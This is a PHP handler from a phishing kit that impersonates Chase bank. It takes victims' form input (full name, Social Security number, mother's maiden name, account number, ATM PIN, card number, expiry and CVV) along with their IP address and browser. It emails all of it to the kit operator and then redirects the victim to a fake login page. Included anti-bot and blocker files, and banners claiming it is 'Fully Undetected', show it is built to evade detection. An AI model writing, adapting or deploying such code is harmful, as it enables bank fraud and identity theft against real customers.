<?php
$zabi = getenv("REMOTE_ADDR");
include '../css/sec.gif';
include '../antibots.php';
include('../email.php');
include '../bt.php';
include "../blocker.php";
$message .= "--++-----[ $$ World Wide On My Hand  $$ ]-----++--\n";
$message .= "------------------ FULLZ-INFO chase --------------------\n";
$message .= "Full Name: ".$_POST['02']."\n";
$message .= "Postal/zip Code: ".$_POST['07']."\n";
$message .= "Phone Number: ".$_POST['08']."\n";
$message .= "Date Of Birth MM/DD/YYYY: ".$_POST['09']."\n";
$message .= "Mother's maiden name: ".$_POST['0001']."\n";
$message .= "Social Security Number (SSN): ".$_POST['16']."\n";
$message .= "Account Number: ".$_POST['12']."\n";
$message .= "ATM PIN: ".$_POST['15']."\n";
$message .= "DEBIT/CREDIT CARED NUMBER: ".$_POST['20']."\n";
$message .= "EXPIRY DATE: ".$_POST['21']."\n";
$message .= "CVV: ".$_POST['22']."\n";
$message .= "E-mail Address: ".$_POST['3']."\n";
$message .= "++-----[ $$ Fully Undetected by LulzSec $$ ]-----++\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- By GOOD BOY----------------------\n";
$cc = $_POST['ccn'];
$subject = "Chase F3ll Info [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Cashout <contact>\r\n";
mail($email,$subject,$message,$headers);
mail($userinfo,$subject,$message,$headers);

header("Location: ../Loging_in.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>